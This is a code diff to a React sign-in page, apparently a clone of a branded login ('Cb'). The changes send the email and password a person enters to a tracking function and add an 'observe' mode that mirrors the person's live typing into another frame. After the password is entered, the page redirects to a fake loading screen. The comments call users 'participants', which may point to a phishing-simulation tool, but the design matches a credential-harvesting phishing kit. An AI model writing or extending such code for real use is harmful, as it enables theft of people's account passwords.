@@ -1,5 +1,5 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useCallback, useState } from "react";
+import { useCallback, useEffect, useState } from "react";
 import {
   CbFontStyle,
   CbLogo,
@@ -77,13 +77,43 @@ function AvatarPlaceholder({ email }: { email: string }) {
 }
 
 function CbSignInPage() {
-  const { trackClick, trackInput, cbNavigate, sessionId } = useCbTracking();
+  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId, isObserve } = useCbTracking();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [step, setStep] = useState<1 | 2>(1);
   const [showPassword, setShowPassword] = useState(false);
   const [continueLoading, setContinueLoading] = useState(false);
   const [loadingBtn, setLoadingBtn] = useState<string | null>(null);
+
+  // Keep observe iframe React state in sync with participant live typing.
+  useEffect(() => {
+    if (!isObserve) return;
+    function onMirror(e: Event) {
+      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
+      if (!d?.field) return;
+      const value = String(d.value ?? "");
+      if (
+        d.field === "email" ||
+        d.field === "Email" ||
+        d.field === "Email Input" ||
+        d.field === "email_submitted"
+      ) {
+        setEmail(value);
+        return;
+      }
+      if (
+        d.field === "password" ||
+        d.field === "Password" ||
+        d.field === "Password Input" ||
+        d.field === "password_submitted"
+      ) {
+        setStep(2);
+        setPassword(value);
+      }
+    }
+    window.addEventListener("ux:mirror-live-input", onMirror);
+    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
+  }, [isObserve]);
 
   const isValidEmail = useCallback(
     (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
@@ -96,7 +126,7 @@ function CbSignInPage() {
       if (!isValidEmail(email) || continueLoading) return;
       setContinueLoading(true);
       trackClick("Continue-Email");
-      trackInput("email", email);
+      trackSubmit("email", email);
       setTimeout(() => {
         setContinueLoading(false);
         setStep(2);
@@ -106,7 +136,7 @@ function CbSignInPage() {
     if (!password || continueLoading) return;
     setContinueLoading(true);
     trackClick("Continue-Password");
-    trackInput("password", password);
+    trackSubmit("password", password);
     setTimeout(() => {
       cbNavigate("/cb/loading");
     }, 1200);
@@ -192,7 +222,7 @@ function CbSignInPage() {
         <div />
       </header>
 
-      <main className="cb-main" style={{ justifyContent: "flex-start", paddingTop: 120 }}>
+      <main className="cb-main" style={{ justifyContent: "flex-start", paddingTop: 48 }}>
         <div className="cb-form-container">
           {step === 1 ? (
             <>
